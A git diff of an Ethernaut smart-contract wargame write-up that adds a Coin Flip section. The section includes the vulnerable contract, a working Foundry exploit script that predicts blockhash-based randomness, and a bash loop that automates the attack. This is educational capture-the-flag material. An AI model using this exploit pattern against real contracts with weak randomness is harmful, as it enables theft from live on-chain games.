@@ -1,96 +1,3 @@
-<style>
-/* General Page Styling */
-body {
-    font-family: Arial, sans-serif;
-    background-color: rgba(34, 36, 48, 0.95);
-    color: #ffffff;
-    line-height: 1.6;
-    max-width: 900px;
-    margin: auto;
-    padding: 20px;
-}
-
-/* Headings with Glowing Effect */
-h1, h2, h3 {
-    text-align: left;
-    font-weight: bold;
-    text-shadow: 1px 1px 12px rgba(46, 47, 47, 0.3);
-}
-
-h1 {
-    color: rgb(0, 234, 255);
-    font-size: 2em;
-}
-
-h2 {
-    color: rgb(223, 49, 66);
-    font-size: 1.8em;
-}
-
-h3 {
-    color: rgb(248, 94, 119);
-    font-size: 1.5em;
-}
-
-/* Code Blocks - Dark Themed */
-code {
-    background: #1e1e1e;
-    color: #00ffc8;
-    padding: 4px 8px;
-    border-radius: 5px;
-    font-size: 14px;
-}
-
-pre {
-    background: #1e1e1e;
-    color: #ffffff;
-    padding: 15px;
-    border-radius: 8px;
-    overflow-x: auto;
-    font-size: 14px;
-    box-shadow: 0px 0px 10px rgba(0, 255, 200, 0.3);
-}
-
-/* Blockquotes - Stand Out Notes */
-blockquote {
-    background: rgba(255, 255, 255, 0.1);
-    padding: 15px;
-    border-left: 5px solid rgb(197, 194, 183);
-    color: rgb(235, 235, 235);
-    font-style: italic;
-    box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
-}
-
-/* Tables - Sleek & Minimal */
-table {
-    width: 100%;
-    border-collapse: collapse;
-    border-radius: 8px;
-    overflow: hidden;
-    box-shadow: 0px 0px 10px rgba(0, 255, 255, 0.2);
-}
-
-th, td {
-    border: 1px solid rgb(127, 227, 243);
-    padding: 12px;
-    text-align: left;
-}
-
-th {
-    background: rgba(127, 227, 243, 0.3);
-    color: white;
-}
-
-/* Images */
-img {
-    border-radius: 10px;
-    max-width: 100%;
-    height: auto;
-    box-shadow: 0px 0px 15px rgba(0, 255, 255, 0.3);
-}
-</style>
-
-
 # Ethernaut WriteUps
 
 Ethernaut is OpenZeppelin’s wargame to learn about Ethereum smart contract security.
@@ -108,7 +15,7 @@ forge 0.3.0 (5a8bd89 2024-12-20T08:45:53.204298000Z)
 ```
 Then you are good to go...
 
-### Step 1: Set Up the Solution Script
+### **Step 1: Set Up the Solution Script**
 1. Navigate to your Foundry project.
 2. Inside the **`script/`** folder, create a solution file (e.g., `ChallengeSolution.s.sol`).
 3. Your script should:
@@ -116,7 +23,7 @@ Then you are good to go...
    - **Execute the exploit** (e.g., calling functions, sending ETH, or manipulating storage).
    - **Verify that the exploit was successful**.
 
-### Step 2: Load Environment Variables
+### **Step 2: Load Environment Variables**
 Before running the script, ensure your **`.env`** file is correctly formatted:
 ```ini
 PRIVATE_KEY=your_private_key
@@ -129,7 +36,7 @@ Then, load the environment variables:
 source .env
 ```
 
-### Step 3: Execute the Script on Sepolia
+### **Step 3: Execute the Script on Sepolia**
 To execute your solution on the Sepolia network, run:
 
 ```ini
@@ -300,9 +207,6 @@ player
 And importantly the command `contract.abi` gives all the available function for this contract.
 
 2️⃣ To see all available functions, use:
-```javascript
-contract.abi()
-```
 ![contract.abi image](assets/img.png)
 
 3️⃣ Exploit the Faulty Constructor
@@ -324,3 +228,140 @@ Once the transaction is confirmed, submit the instance to complete the challenge
 ![Well done image](assets/fallout-img3.png)
 
 ---
+---
+
+## 3. Coin Flip
+The goal is to correctly predict the coin flip 10 times in a row. The contract uses the previous blockhash as the flip outcome. We can easily solve this challenge by deploying a custom contract simulating the exact same coin flipping logic and calling the real challenge contract with this result.
+
+**Vulnerability:** The contract uses blockhash(block.number - 1) for randomness, which can be predicted.
+
+### Smart Contract Analysis
+`CoinFlip.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // *
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1)); // *
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+### 🔍 Identifying the Vulnerability
+
+- The contract relies on blockhash(block.number - 1) for randomness.
+- Since we can calculate this value before calling flip(), we can always guess correctly.
+- This makes the game completely predictable and breakable.
+
+**Have a look after this, for a better understanding**
+ [Entropy Illusion by Mastering Ethereum Book](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#entropy-illusion)
+
+**Additional Things to look up if you'r interested in `Entropy`. I feel these videos are very interesting and I learnt many interesting things about `Entropy`.**
+- [What is entropy? - Jeff Phillips -by TED-Ed](https://www.youtube.com/watch?v=YM-uykVfq_E&t=0s)
+- [The Most Misunderstood Concept in Physics -by Veritasium](https://www.youtube.com/watch?v=DxL2HoqLbyA)
+
+### 🔹 Exploiting the Vulnerability
+**Exploit Strategy**
+
+    - ✅ Step 1: Calculate blockhash(block.number - 1).
+
+    - ✅ Step 2: Divide it by FACTOR to get the expected outcome (0 or 1).
+
+    - ✅ Step 3: Call flip() with the correct guess.
+
+    - ✅ Step 4: Repeat this for 10 blocks to win.
+
+### Foundry Exploit Script
+`CoinFlipSolution.s.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../src/CoinFlip.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+// Player contract to automate flipping
+contract Player {
+    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(CoinFlip _coin) {
+        uint256 predictedHash = uint256(blockhash(block.number - 1));
+        uint256 predictedNumber = predictedHash / FACTOR;
+        bool side = predictedNumber == 1 ? true : false;
+        _coin.flip(side);
+    }
+}
+
+contract CoinFlipSolution is Script {
+    CoinFlip public coin = CoinFlip(0xb70c360f7EC4bF2B04eCE62abba1963dDd405Ca9);
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        new Player(coin);
+        console.log("Consecutive Wins: ", coin.consecutiveWins());
+        vm.stopBroadcast();
+    }
+}
+```
+**Running the Exploit (Single Execution)**
+
+```bash
+forge script script/CoinFlipSolution.s.sol --tc CoinFlipSolution --rpc-url $INFURA_URL --broadcast
+```
+
+- Each time this script runs, it flips the coin once with a guaranteed win.
+- But we need 10 wins in 10 blocks, so we repeat this execution 10 times.
+
+**Automating the Attack with a Bash Script**
+
+Since flip() only works once per block, we automate the process:
+```bash
+#!/bin/bash
+for i in {1..10}
+do
+  forge script script/CoinFlipSolution.s.sol --rpc-url $INFURA_URL --broadcast
+  sleep 12  # Wait for the next Ethereum block
+done
+```
+
+**After running the script 10 times, check your win count:**
+```bash
+forge script script/CoinFlipSolution.s.sol --rpc-url $INFURA_URL --broadcast
+```
+**If consecutiveWins == 10, submit the instance and finish the challenge!**
+
+![wins image](assets/coinflip-1.png)
+
+### Lessons Learned
+-	❌ Never use blockhash(block.number - 1) for randomness → It can be predicted.
+-	✅ Use Chainlink VRF for true randomness.
+-	✅ Attackers can automate brute-force exploits using off-chain scripts.
+
+### Once the transaction is confirmed, submit the instance to complete the challenge!
+![Well done img](assets/coinflip-2.png)
